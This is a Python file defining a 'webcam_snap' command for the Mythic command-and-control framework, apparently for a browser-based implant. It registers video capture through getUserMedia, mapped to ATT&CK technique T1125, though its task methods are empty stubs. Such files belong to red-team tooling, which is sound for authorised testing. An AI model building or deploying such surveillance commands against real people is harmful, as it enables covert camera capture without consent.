from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class WebcamSnapArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class WebcamSnapCommand(CommandBase):
    cmd = "webcam_snap"
    needs_admin = False
    help_cmd = "webcam_snap"
    description = "Capture a single frame from the webcam via getUserMedia. Note: may trigger a browser permission prompt."
    version = 1
    author = "@grampae"
    parameters = []
    attackmapping = ["T1125"]
    argument_class = WebcamSnapArguments
    browser_script = BrowserScript(script_name="webcam_snap", author="@grampae", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Browser]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
